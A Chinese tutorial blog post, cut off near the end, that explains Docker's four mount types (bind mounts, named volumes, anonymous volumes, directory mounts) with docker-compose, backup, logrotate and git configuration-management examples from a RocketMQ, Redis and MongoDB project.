data-v-61fb5e44="">
            Docker 数据持久化完全指南：四种挂载方式详解与实战
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3148645291002232/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    IT橘子皮
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-24T03:43:03.000Z" title="Mon Nov 24 2025 03:43:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-24
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在 Docker 容器化部署中，数据持久化是至关重要的一环。本文基于您提供的 docker-compose.yml 文件和实际项目场景，详细解析四种主要的 Docker 挂载方式：<strong>绑定挂载</strong>、<strong>命名卷挂载</strong>、<strong>匿名卷挂载</strong>和<strong>目录挂载</strong>，并通过 RocketMQ 微服务项目进行实战演示。</p>
<h2 data-id="heading-0">一、四种挂载方式概述</h2>
<h3 data-id="heading-1">1.1 核心概念对比</h3>








































<table><thead><tr><th>挂载类型</th><th>管理方式</th><th>持久化</th><th>可见性</th><th>适用场景</th></tr></thead><tbody><tr><td><strong>绑定挂载</strong>​</td><td>用户管理</td><td>是</td><td>宿主机可见</td><td>配置文件、开发环境</td></tr><tr><td><strong>命名卷挂载</strong>​</td><td>Docker 管理</td><td>是</td><td>Docker 管理</td><td>数据库数据、生产环境</td></tr><tr><td><strong>匿名卷挂载</strong>​</td><td>Docker 自动</td><td>临时</td><td>隐藏</td><td>缓存、临时数据</td></tr><tr><td><strong>目录挂载</strong>​</td><td>用户管理</td><td>是</td><td>宿主机可见</td><td>日志、共享数据</td></tr></tbody></table>
<h3 data-id="heading-2">1.2 在项目中的实际应用</h3>
<p>根据您的 docker-compose.yml 文件：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># 绑定挂载 - 配置文件（重点分析）</span>
<span class="hljs-attr">rmqbroker:</span>
  <span class="hljs-attr">volumes:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">./broker.conf:/opt/rocketmq/conf/broker.conf</span>

<span class="hljs-comment"># 命名卷挂载 - 数据库数据</span>
<span class="hljs-attr">redis:</span>
  <span class="hljs-attr">volumes:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">redis_data:/data</span>
<span class="hljs-attr">mongo:</span>
  <span class="hljs-attr">volumes:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">mongo_data:/data/db</span>

<span class="hljs-comment"># 目录挂载 - 应用日志</span>
<span class="hljs-attr">my-springboot-app:</span>
  <span class="hljs-attr">volumes:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">./logs:/home/spring/logs</span>

<span class="hljs-comment"># 匿名卷挂载 - rmqnamesrv（无显式配置）</span>
</code></pre>
<h2 data-id="heading-3">二、绑定挂载 (Bind Mounts) 深度解析：配置管理的终极解决方案</h2>
<h3 data-id="heading-4">2.1 技术原理与四大核心优势</h3>
<p>绑定挂载是<strong>直接将宿主机文件系统路径映射到容器内部</strong>的挂载方式。</p>
<h4 data-id="heading-5">✅ 配置外部化 - 配置与镜像分离</h4>
<pre><code class="hljs language-bash" lang="bash">rmqbroker:
  volumes:
    - ./broker.conf:/opt/rocketmq/conf/broker.conf
</code></pre>
<p><strong>实现原理：</strong></p>
<ul>
<li>配置文件完全独立于 Docker 镜像</li>
<li>镜像保持纯净，不包含环境特定配置</li>
<li>同一镜像可适配不同环境（开发、测试、生产）</li>
</ul>
<p><strong>实战价值：</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 不同环境使用不同配置</span>
config/
├── dev/
│   └── broker.conf    <span class="hljs-comment"># 开发环境配置</span>
├── <span class="hljs-built_in">test</span>/
│   └── broker.conf    <span class="hljs-comment"># 测试环境配置</span>
└── prod/
    └── broker.conf    <span class="hljs-comment"># 生产环境配置</span>

<span class="hljs-comment"># 通过环境变量切换配置</span>
docker compose -f docker-compose.yml -f docker-compose.dev.yml up
</code></pre>
<h4 data-id="heading-6">✅ 实时编辑 - 宿主机修改立即生效</h4>
<p><strong>技术实现：</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. 宿主机编辑配置文件</span>
vim broker.conf
<span class="hljs-comment"># 修改：brokerRole = SYNC_MASTER</span>

<span class="hljs-comment"># 2. 容器内实时同步（无需重启）</span>
docker compose <span class="hljs-built_in">exec</span> rmqbroker <span class="hljs-built_in">cat</span> /opt/rocketmq/conf/broker.conf
<span class="hljs-comment"># 立即看到：brokerRole = SYNC_MASTER</span>

<span class="hljs-comment"># 3. 热重载配置（部分服务支持）</span>
docker compose <span class="hljs-built_in">exec</span> rmqbroker sh -c <span class="hljs-string">"kill -HUP 1"</span>
</code></pre>
<p><strong>开发效率提升：</strong></p>
<ul>
<li>开发阶段：避免重复构建镜像</li>
<li>调试阶段：快速验证配置变更</li>
<li>运维阶段：紧急配置修复</li>
</ul>
<h4 data-id="heading-7">✅ 版本控制 - 配置文件可纳入 Git 管理</h4>
<p><strong>Git 集成方案：</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 配置文件纳入版本控制</span>
git add broker.conf docker-compose.yml
git commit -m <span class="hljs-string">"feat: update rocketmq broker configuration"</span>

<span class="hljs-comment"># 配置变更追踪</span>
git <span class="hljs-built_in">log</span> --oneline --follow broker.conf
<span class="hljs-comment"># 输出：a1b2c3d 优化Broker内存配置</span>
<span class="hljs-comment">#       e4f5g6h 初始Broker配置</span>

<span class="hljs-comment"># 分支策略管理</span>
git checkout feature/new-cluster
<span class="hljs-comment"># 修改配置测试新功能</span>
</code></pre>
<p><strong>.gitignore 配置示例：</strong></p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># 忽略生成的文件</span>
<span class="hljs-string">logs/</span>
<span class="hljs-string">data/</span>
<span class="hljs-string">tmp/</span>

<span class="hljs-comment"># 保留配置文件</span>
<span class="hljs-type">!broker.conf</span>
<span class="hljs-type">!application.yml</span>

<span class="hljs-comment"># 忽略本地覆盖配置</span>
<span class="hljs-string">broker.conf.local</span>
<span class="hljs-string">application-*.yml</span>
</code></pre>
<h4 data-id="heading-8">✅ 环境适配 - 不同环境使用不同配置</h4>
<p><strong>多环境配置管理：</strong></p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># docker-compose.override.yml（开发环境）</span>
<span class="hljs-attr">version:</span> <span class="hljs-string">'3.8'</span>
<span class="hljs-attr">services:</span>
  <span class="hljs-attr">rmqbroker:</span>
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">./config/dev/broker.conf:/opt/rocketmq/conf/broker.conf</span>
    <span class="hljs-attr">environment:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">JAVA_OPTS=-Xmx512m</span> <span class="hljs-string">-Xms512m</span>

<span class="hljs-comment"># docker-compose.prod.yml（生产环境）</span>
<span class="hljs-attr">version:</span> <span class="hljs-string">'3.8'</span>
<span class="hljs-attr">services:</span>
  <span class="hljs-attr">rmqbroker:</span>
    <span class="hljs-attr">volumes:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">./config/prod/broker.conf:/opt/rocketmq/conf/broker.conf</span>
    <span class="hljs-attr">environment:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">JAVA_OPTS=-Xmx2g</span> <span class="hljs-string">-Xms2g</span>
</code></pre>
<p><strong>环境特定配置示例：</strong></p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># config/dev/broker.conf（开发环境）</span>
<span class="hljs-attr">brokerRole</span> = ASYNC_MASTER
<span class="hljs-attr">flushDiskType</span> = ASYNC_FLUSH
<span class="hljs-attr">autoCreateTopicEnable</span> = <span class="hljs-literal">true</span>

<span class="hljs-comment"># config/prod/broker.conf（生产环境）  </span>
<span class="hljs-attr">brokerRole</span> = SYNC_MASTER
<span class="hljs-attr">flushDiskType</span> = SYNC_FLUSH
<span class="hljs-attr">autoCreateTopicEnable</span> = <span class="hljs-literal">false</span>
</code></pre>
<h3 data-id="heading-9">2.2 项目实战：RocketMQ Broker 配置绑定的完整工作流</h3>
<p><strong>broker.conf 配置文件内容：</strong></p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># RocketMQ Broker 配置 - 外部化配置示例</span>
<span class="hljs-attr">brokerClusterName</span> = <span class="hljs-variable">${CLUSTER_NAME:-DefaultCluster}</span>
<span class="hljs-attr">brokerName</span> = broker-<span class="hljs-variable">${BROKER_ID:-a}</span>
<span class="hljs-attr">brokerId</span> = <span class="hljs-variable">${BROKER_ID:-0}</span>

<span class="hljs-comment"># 消息存储配置</span>
<span class="hljs-attr">deleteWhen</span> = <span class="hljs-number">04</span>
<span class="hljs-attr">fileReservedTime</span> = <span class="hljs-number">48</span>
<span class="hljs-attr">mapedFileSizeCommitLog</span> = <span class="hljs-number">1073741824</span>

<span class="hljs-comment"># 高可用配置</span>
<span class="hljs-attr">brokerRole</span> = <span class="hljs-variable">${BROKER_ROLE:-ASYNC_MASTER}</span>
<span class="hljs-attr">flushDiskType</span> = <span class="hljs-variable">${FLUSH_DISK_TYPE:-ASYNC_FLUSH}</span>

<span class="hljs-comment"># 开发环境特供</span>
<span class="hljs-attr">autoCreateTopicEnable</span> = <span class="hljs-variable">${AUTO_CREATE_TOPIC:-true}</span>
<span class="hljs-attr">autoCreateSubscriptionGroup</span> = <span class="hljs-variable">${AUTO_CREATE_SUBSCRIPTION:-true}</span>

<span class="hljs-comment"># 动态获取NameServer地址</span>
<span class="hljs-attr">namesrvAddr</span> = <span class="hljs-variable">${NAMESRV_ADDR:-rmqnamesrv:9876}</span>
</code></pre>
<p><strong>完整的配置管理流水线：</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># config-pipeline.sh - 配置管理完整工作流</span>

<span class="hljs-comment"># 1. 配置验证</span>
<span class="hljs-function"><span class="hljs-title">validate_config</span></span>() {
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"🔍 验证配置文件语法..."</span>
    docker compose config -q
    <span class="hljs-keyword">if</span> [ $? -eq 0 ]; <span class="hljs-keyword">then</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"✅ 配置文件语法正确"</span>
    <span class="hljs-keyword">else</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"❌ 配置文件存在错误"</span>
        <span class="hljs-built_in">exit</span> 1
    <span class="hljs-keyword">fi</span>
}

<span class="hljs-comment"># 2. 配置差异化检查</span>
<span class="hljs-function"><span class="hljs-title">check_config_diff</span></span>() {
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"📊 检查配置变更..."</span>
    <span class="hljs-keyword">if</span> [ -f <span class="hljs-string">"broker.conf.last"</span> ]; <span class="hljs-keyword">then</span>
        diff -u broker.conf.last broker.conf || <span class="hljs-literal">true</span>
    <span class="hljs-keyword">fi</span>
    <span class="hljs-built_in">cp</span> broker.conf broker.conf.last
}

<span class="hljs-comment"># 3. 安全扫描</span>
<span class="hljs-function"><span class="hljs-title">security_scan</span></span>() {
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"🔒 配置文件安全扫描..."</span>
    <span class="hljs-comment"># 检查敏感信息</span>
    <span class="hljs-keyword">if</span> grep -q <span class="hljs-string">"password|secret|key"</span> broker.conf; <span class="hljs-keyword">then</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"⚠️  发现可能的敏感信息，请确认已脱敏"</span>
    <span class="hljs-keyword">fi</span>
}

<span class="hljs-comment"># 4. 配置部署</span>
<span class="hljs-function"><span class="hljs-title">deploy_config</span></span>() {
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"🚀 部署配置文件..."</span>
    docker compose restart rmqbroker
    <span class="hljs-built_in">sleep</span> 5
    docker compose logs rmqbroker --<span class="hljs-built_in">tail</span>=20
}

<span class="hljs-comment"># 执行完整流水线</span>
validate_config
check_config_diff  
security_scan
deploy_config
</code></pre>
<h3 data-id="heading-10">2.3 配置绑定的高级特性</h3>
<h4 data-id="heading-11">配置模板与变量替换</h4>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 使用 envsubst 进行配置模板化</span>
cat &gt; broker.conf.template &lt;&lt; 'EOF'
<span class="hljs-attr">brokerClusterName</span> = <span class="hljs-variable">${CLUSTER_NAME}</span>
<span class="hljs-attr">brokerName</span> = broker-<span class="hljs-variable">${BROKER_ID}</span>
<span class="hljs-attr">namesrvAddr</span> = <span class="hljs-variable">${NAMESRV_ADDR}</span>
EOF

<span class="hljs-comment"># 生成环境特定配置</span>
export <span class="hljs-attr">CLUSTER_NAME</span>=ProductionCluster
export <span class="hljs-attr">BROKER_ID</span>=a
export <span class="hljs-attr">NAMESRV_ADDR</span>=rmqnamesrv:<span class="hljs-number">9876</span>

envsubst &lt; broker.conf.template &gt; broker.conf
</code></pre>
<h4 data-id="heading-12">配置加密与安全</h4>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 使用 ansible-vault 加密敏感配置</span>
ansible-vault encrypt broker-secrets.conf

<span class="hljs-comment"># 在 CI/CD 中解密</span>
<span class="hljs-built_in">echo</span> <span class="hljs-variable">$VAULT_PASSWORD</span> | ansible-vault decrypt \
  --output broker.conf \
  broker-secrets.conf
</code></pre>
<h2 data-id="heading-13">三、命名卷挂载 (Named Volumes) 深度解析</h2>
<h3 data-id="heading-14">3.1 技术原理</h3>
<p>命名卷是 <strong>Docker 管理的持久化存储卷</strong>，具有唯一的名称，生命周期独立于容器。</p>
<h3 data-id="heading-15">3.2 项目实战：Redis 和 MongoDB 数据持久化</h3>
<p><strong>配置示例：</strong></p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-attr">redis:</span>
  <span class="hljs-attr">volumes:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">redis_data:/data</span>

<span class="hljs-attr">mongo:</span>
  <span class="hljs-attr">volumes:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">mongo_data:/data/db</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">mongo_config:/data/configdb</span>

<span class="hljs-attr">volumes:</span>
  <span class="hljs-attr">redis_data:</span>
  <span class="hljs-attr">mongo_data:</span>
  <span class="hljs-attr">mongo_config:</span>
</code></pre>
<p><strong>实战操作：</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. 查看命名卷信息</span>
docker volume <span class="hljs-built_in">ls</span>
docker volume inspect rocket-demo_redis_data

<span class="hljs-comment"># 2. 数据持久化验证</span>
<span class="hljs-comment"># 写入测试数据</span>
docker compose <span class="hljs-built_in">exec</span> redis redis-cli -a 123456 <span class="hljs-built_in">set</span> test_key <span class="hljs-string">"hello_redis"</span>

<span class="hljs-comment"># 重启服务验证数据持久化</span>
docker compose restart redis
docker compose <span class="hljs-built_in">exec</span> redis redis-cli -a 123456 get test_key

<span class="hljs-comment"># 3. 备份命名卷数据</span>
docker run --<span class="hljs-built_in">rm</span> -v rocket-demo_redis_data:/source -v $(<span class="hljs-built_in">pwd</span>)/backup:/backup alpine \
  tar czf /backup/redis_backup_$(<span class="hljs-built_in">date</span> +%Y%m%d).tar.gz -C /source .
</code></pre>
<p><strong>命名卷实际路径：</strong></p>
<p>根据您的图片信息，命名卷存储在 Docker 默认路径：</p>
<pre><code class="hljs language-bash" lang="bash">/var/lib/docker/volumes/rocket-demo_redis_data/_data
/var/lib/docker/volumes/rocket-demo_mongo_data/_data
</code></pre>
<h3 data-id="heading-16">3.3 管理命令大全</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 创建命名卷</span>
docker volume create my_volume

<span class="hljs-comment"># 查看卷详情</span>
docker volume inspect volume_name

<span class="hljs-comment"># 备份卷数据</span>
docker run --<span class="hljs-built_in">rm</span> -v volume_name:/source -v $(<span class="hljs-built_in">pwd</span>):/backup alpine \
  tar czf /backup/backup.tar.gz -C /source .

<span class="hljs-comment"># 恢复卷数据</span>
docker run --<span class="hljs-built_in">rm</span> -v volume_name:/target -v $(<span class="hljs-built_in">pwd</span>):/backup alpine \
  tar xzf /backup/backup.tar.gz -C /target

<span class="hljs-comment"># 清理未使用卷</span>
docker volume prune
</code></pre>
<h2 data-id="heading-17">四、匿名卷挂载 (Anonymous Volumes) 深度解析</h2>
<h3 data-id="heading-18">4.1 技术原理</h3>
<p>匿名卷是 <strong>Docker 自动创建和管理的临时卷</strong>，没有指定名称，通常用于容器运行时数据。</p>
<h3 data-id="heading-19">4.2 项目实战：RocketMQ NameServer 的匿名卷</h3>
<p><strong>配置分析：</strong></p>
<pre><code class="hljs language-makefile" lang="makefile"><span class="hljs-section">rmqnamesrv:</span>
  <span class="hljs-comment"># 没有配置 volumes，使用匿名卷</span>
</code></pre>
<p><strong>根据您的图片信息分析：</strong></p>
<p>从 <code>docker inspect rmqnamesrv</code>输出可以看到，容器使用匿名卷存储运行时数据：</p>
<pre><code class="hljs language-bash" lang="bash">/var/lib/docker/containers/8fbef265e72791e4aa229079f5e5820929546bebd9fd5beabdf53458fbfae99c/
</code></pre>
<p><strong>实战验证：</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. 查看匿名卷挂载点</span>
docker inspect rmqnamesrv | grep -A 10 -B 5 Mounts

<span class="hljs-comment"># 2. 验证数据非持久化</span>
<span class="hljs-comment"># 查看当前存储状态</span>
docker compose <span class="hljs-built_in">exec</span> rmqnamesrv <span class="hljs-built_in">du</span> -sh /home/rocketmq/store

<span class="hljs-comment"># 重启服务（数据可能丢失）</span>
docker compose restart rmqnamesrv
</code></pre>
<h3 data-id="heading-20">4.3 匿名卷的实际路径结构</h3>
<pre><code class="hljs language-ini" lang="ini">/var/lib/docker/containers/<span class="hljs-section">[容器ID]</span>/
├── mounts/           <span class="hljs-comment"># 挂载点目录</span>
├── resolv.conf       <span class="hljs-comment"># DNS配置</span>
├── hosts             <span class="hljs-comment"># 主机文件</span>
├── hostname          <span class="hljs-comment"># 主机名</span>
└── <span class="hljs-section">[容器ID]</span>-json.log <span class="hljs-comment"># 日志文件</span>
</code></pre>
<h2 data-id="heading-21">五、目录挂载 (Directory Mounts) 深度解析</h2>
<h3 data-id="heading-22">5.1 技术原理</h3>
<p>目录挂载是绑定挂载的一种特殊形式，专门用于<strong>挂载整个目录而非单个文件</strong>。</p>
<h3 data-id="heading-23">5.2 项目实战：SpringBoot 应用日志目录</h3>
<p><strong>配置示例：</strong></p>
<pre><code class="hljs language-bash" lang="bash">my-springboot-app:
  volumes:
    - ./logs:/home/spring/logs
</code></pre>
<p><strong>目录结构规划：</strong></p>
<pre><code class="hljs language-lua" lang="lua">rocket-demo/
├── logs/                           # 日志根目录
│   ├── application/               # 应用日志
│   │   ├── springboot-app.<span class="hljs-built_in">log</span>
│   │   └── <span class="hljs-built_in">error</span>.<span class="hljs-built_in">log</span>
│   └── rocketmqlogs/              # RocketMQ 客户端日志
│       ├── rocketmq_client.<span class="hljs-built_in">log</span>
│       └── rocketmq_app.<span class="hljs-built_in">log</span>
└── docker-compose.yml
</code></pre>
<p><strong>实战操作：</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. 创建日志目录结构</span>
<span class="hljs-built_in">mkdir</span> -p logs/application logs/rocketmqlogs
<span class="hljs-built_in">chmod</span> 755 logs logs/application logs/rocketmqlogs

<span class="hljs-comment"># 2. 验证日志写入</span>
docker compose logs my-springboot-app
<span class="hljs-built_in">ls</span> -la logs/application/

<span class="hljs-comment"># 3. 日志轮转配置（在宿主机设置）</span>
<span class="hljs-built_in">cat</span> &gt; /etc/logrotate.d/rocket-demo &lt;&lt; <span class="hljs-string">EOF
/root/rocket-demo/logs/application/*.log {
    daily
    missingok
    rotate 7
    compress
    delaycompress
    notifempty
    copytruncate
}
EOF</span>
</code></pre>
<h3 data-id="heading-24">5.3 权限管理最佳实践</h3>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 设置正确的目录权限</span>
sudo <span class="hljs-built_in">chown</span> -R 1000:1000 logs/    <span class="hljs-comment"># 1000 是容器内应用用户的UID</span>
sudo <span class="hljs-built_in">chmod</span> -R 755 logs/

<span class="hljs-comment"># 在 Dockerfile 中确保用户一致性</span>
<span class="hljs-comment"># FROM openjdk:8-jdk-alpine</span>
<span class="hljs-comment"># RUN adduser -D -u 1000 spring</span>
<span class="hljs-comment"># USER spring</span>
</code></pre>
<h2 data-id="heading-25">六、配置文件绑定的四大优势深度实战</h2>
<h3 data-id="heading-26">6.1 ✅ 配置外部化的企业级实践</h3>
<p><strong>配置中心架构：</strong></p>
<pre><code class="hljs language-csharp" lang="csharp">config-center/
├── <span class="hljs-keyword">base</span>/                 <span class="hljs-meta"># 基础配置</span>
│   ├── broker-<span class="hljs-keyword">base</span>.conf
│   └── application-<span class="hljs-keyword">base</span>.yml
├── environments/         <span class="hljs-meta"># 环境配置</span>
│   ├── dev/
│   ├── test/
│   └── prod/
└── templates/           <span class="hljs-meta"># 配置模板</span>
    └── broker.conf.tpl
</code></pre>
<p><strong>动态配置注入：</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># docker-compose.yml 支持环境变量注入</span>
rmqbroker:
  volumes:
    - ./config/<span class="hljs-variable">${ENV:-dev}</span>/broker.conf:/opt/rocketmq/conf/broker.conf
  environment:
    - ENV=<span class="hljs-variable">${ENV:-dev}</span>
    - CLUSTER_NAME=<span class="hljs-variable">${CLUSTER_NAME:-DefaultCluster}</span>
</code></pre>
<h3 data-id="heading-27">6.2 ✅ 实时编辑的开发效率提升</h3>
<p><strong>开发调试工作流：</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-meta">#!/bin/bash</span>
<span class="hljs-comment"># dev-watch.sh - 开发环境配置监听和热重载</span>

<span class="hljs-comment"># 监听配置文件变化</span>
inotifywait -m -e modify broker.conf |
<span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> path action file; <span class="hljs-keyword">do</span>
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"🔧 检测到配置变更: <span class="hljs-variable">$file</span>"</span>
    
    <span class="hljs-comment"># 验证配置语法</span>
    <span class="hljs-keyword">if</span> docker compose <span class="hljs-built_in">exec</span> rmqbroker <span class="hljs-built_in">test</span> -f /opt/rocketmq/conf/broker.conf; <span class="hljs-keyword">then</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"✅ 配置文件已同步到容器"</span>
        
        <span class="hljs-comment"># 尝试热重载</span>
        docker compose <span class="hljs-built_in">exec</span> rmqbroker sh -c <span class="hljs-string">"pkill -HUP java"</span> 2&gt;/dev/null &amp;&amp; \
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"🔥 配置热重载成功"</span> || \
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"⚠️  需要重启服务使配置生效"</span>
    <span class="hljs-keyword">fi</span>
<span class="hljs-keyword">done</span>
</code></pre>
<h3 data-id="heading-28">6.3 ✅ 版本控制的完整 Git 策略</h3>
<p><strong>Git 分支策略：</strong></p>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-meta"># 配置管理的 Git 工作流</span>
git flow feature start broker-config-optimization

<span class="hljs-meta"># 1. 在特性分支修改配置</span>
vim broker.conf
git <span class="hljs-keyword">add</span> broker.conf
git commit -m <span class="hljs-string">"feat: 优化Broker内存配置"</span>

<span class="hljs-meta"># 2. 代码审查后合并</span>
git flow feature finish broker-config-optimization

<span class="hljs-meta"># 3. 标签发布</span>
git tag -a v1<span class="hljs-number">.2</span><span class="hljs-number">.0</span>-config -m <span class="hljs-string">"版本1.2.0配置优化"</span>
</code></pre>
<p><strong>.gitattributes 配置：</strong></p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># 配置文件的合并策略</span>
broker.conf <span class="hljs-attr">merge</span>=union
*.conf <span class="hljs-attr">diff</span>=config

<span class="hljs-comment"># 敏感配置模板</span>
broker.conf.example text <span class="hljs-attr">eol</span>=lf
</code></pre>
<h3 data-id="heading-29">6.4 ✅ 环境适配的完整方案</h3>
<p><strong>环境配置矩阵：</strong></p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># config-matrix.yml</span>
<span class="hljs-attr">environments:</span>
  <span class="hljs-attr">dev:</span>
    <span class="hljs-attr">broker_role:</span> <span class="hljs-string">ASYNC_MASTER</span>
    <span class="hljs-attr">auto_create_topic:</span> <span class="hljs-literal">true</span>
    <span class="hljs-attr">memory:</span> <span class="hljs-string">512m</span>
  <span class="hljs-attr">test:</span>
